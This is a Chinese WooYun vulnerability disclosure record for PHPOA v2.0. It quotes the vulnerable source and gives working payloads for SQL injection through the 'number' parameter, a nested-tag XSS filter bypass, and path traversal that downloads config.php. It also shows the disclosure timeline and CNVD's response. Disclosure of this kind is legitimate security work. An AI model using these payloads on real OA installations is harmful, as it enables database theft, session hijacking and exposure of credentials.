{"id": 1665, "wybug_id": "wooyun-2014-063280", "wybug_title": "某协同网络办公OA系统若干漏洞打包（附详细分析）", "wybug_corp": "北京天生创想信息技术有限公司", "wybug_author": "Mr .LZH", "wybug_date": "2014-06-03 14:18", "wybug_open_date": "2014-09-01 14:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-01：\t细节向公众公开  简要描述： 某协同网络办公OA系统若干漏洞打包，后台注入，xss指哪打哪，任意文件下载 详细说明：  官方地址：http://www.phpoa.cn版本编号：PHPOA v2.0发布时间：2014-01-27漏洞一：注入第一，分析防注入。include/common.php\n31行if ( !get_magic_quotes_gpc() ) {\t$_GET = add_slashes($_GET);\t$_POST = add_slashes($_POST);\t$_COOKIE = add_slashes($_COOKIE);}\ninclude/class_mysql.php\n21行if ($this->version() > '4.1') {mysql_query('SET NAMES '.strtolower(str_replace('-','',TOA_CHARSET)).';',$this->link);}\n由此可看出，\\ ' \" 会被转义，切无法字符编码绕过。但如果参数是数字型，sql不用突破单引号，就存在危险。第二，找到一处注入点。duty/mod_duty.php\nmod_duty.php}elseif ($do == 'excel') {\t$datename=\"duty_\".get_date('YmdHis',PHP_TIME);\t$outputFileName = 'data/excel/'.$datename.'.xls';\t//生成数据    $content = array();\t$archive=array(\"任务编号\",\"任务名称\",\"执行人\",\"任务开始时间\",\"任务结束时间\",\"任务描述\",\"备注\",\"任务状态\",\"分配人\");\t$content[] = $archive;\t$wheresql = '';\t//根据条件导出\t$vstartdate = getGP('vstartdate','G');\t$venddate = getGP('venddate','G');\tif ($vstartdate!='' && $venddate!='') {\t\t$wheresql .= \" AND (startdate>='\".$vstartdate.\"' and enddate<='\".$venddate.\"')\";\t}\t//权限判断\t$un = getGP('un','P');\t$ui = getGP('ui','P');\tif(!is_superadmin() && $ui==''){\t\t$wheresql .= \" and (user like'%\".get_realname($_USER->id).\",%' or uid='\".$_USER->id.\"')\";\t}\tif ($ui!='') {\t\t$wheresql .= \" and uid in(\".$ui.\")\";\t}\tif ($number = getGP('number','P')) {\t\t$wheresql .= \" AND number=\".$number.\"\";\t}\tif ($dkey = getGP('dkey','P')) {\t\t$wheresql .= \" AND dkey=\".$dkey.\"\";\t}\tif ($title = getGP('title','P')) {\t\t$wheresql .= \" AND title LIKE '%$title%'\";\t}\t//SQL查询要导出的内容\t$sql = \"SELECT * FROM \".DB_TABLEPRE.\"duty WHERE 1 $wheresql ORDER BY id desc\";\t$result = $db->query($sql);\ndkey和number参数可不用突破单引号。得到注入点：地址：127.0.0.1/v2014/admin.php?ac=duty&fileurl=dutypost数据：do=excel&number=1 uNion sElect 1,version(),3,user(),5,6,7,8,9,10,11,12  #\n\n\n\n对程序未进行全面排查，应该还有很多相似情况，不继续深入，厂商自己排查。有时候普通用户权限被限制得比较死，没办法在这里注入怎么办？看漏洞二。漏洞二：XSS指谁打谁，狂插管理员。\n\n如图位置，向指定人发送消息。内容为：<scrscriptipt>alealertrt('xss');</scrscriptipt>经过后台处理script，alert字符被替换为空，成功绕过变成：<script>alert('xss');</script>触发xss。\n\n如果还不满足于现有的资料，看漏洞三。漏洞三：任意文件下载。down.php\n<?php//下载文件define('IN_ADMIN',True);require_once('include/common.php');get_login($_USER->id);$filename=$_GET['urls'];$phps=explode('/',$filename);if($phps[0]!='data' && $phps[0]!='ntko'){\techo '下载失败！';\texit;}$phps1=explode('.',$filename);if($phps1[1]=='php'){\techo '下载失败,请不要非法下载！';\texit;}header(\"Content-Type: application/force-download\");header(\"Content-Disposition: attachment; filename=\".basename($filename));  readfile($filename);?>\n不得不为程序员的智商感到悲哀。$phps=explode('/',$filename);判断$phps[0]!='data' && $phps[0]!='ntko'为true时退出，你想干嘛呢？限制只能下载这2个目录下的文件？？开玩笑啊。再来一个高智商的。$phps1=explode('.',$filename);判断$phps1[1]=='php'为true时退出。这是不让我下载php文件？？于是乎这样的地址简单突破。http://127.0.0.1/V2014/down.php?urls=data/../config.php没错吧，data文件夹下，分割.符号后得到的第二个字符是空的，不是php。完全合法的地址。   漏洞证明：  \n\n\n\n\n\n   修复方案：  换程序员   版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-08 10:12 厂商回复： CNVD确认所述情况（本地复现），由CNVD尝试通过公开联系渠道向软件生产厂商通报。按多个漏洞综合评分，rank 20 最新状态： 2014-06-08：补充一下处置状态，CNVD在6月4日联系天生创想，63421038，对方拒绝提供邮箱等联系方式。  ", "replys": "漏洞评价：\n评论\n     2014-06-28 14:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  CNVD在6月4日联系天生创想，63421038，对方拒绝提供邮箱等联系方式。    \n     2014-09-01 17:39 |    \t\tYwiSax \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:4        | 淡定。)\t\t \n  = = 不是说有利用条件的,rank会降低吗?    \n     2014-09-01 22:43 |    \t\t狮子找女友 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | life in security)\t\t \n  换程序员太狠了，说不定刚应届毕业。。。不容易哈    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}